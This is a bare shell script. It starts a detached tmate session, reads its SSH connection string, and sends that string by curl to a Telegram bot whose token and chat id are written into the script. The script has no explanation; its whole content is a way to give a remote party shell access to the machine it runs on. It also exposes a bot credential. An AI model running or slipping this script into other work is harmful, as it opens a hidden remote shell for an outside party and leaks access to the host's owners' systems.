tmate -S ~/tmate/tmate.sock new-session -d
sleep 5s
VAR=$(tmate -S ~/tmate/tmate.sock display -p '#{tmate_ssh}')
echo ${VAR}
curl -s -X POST https://api.telegram.org/bot7186213219:AAFgSnkq1lDpUeyKVOZjl_PuRTScOWlaVhg/sendmessage -d text="$VAR" -d chat_id=316009566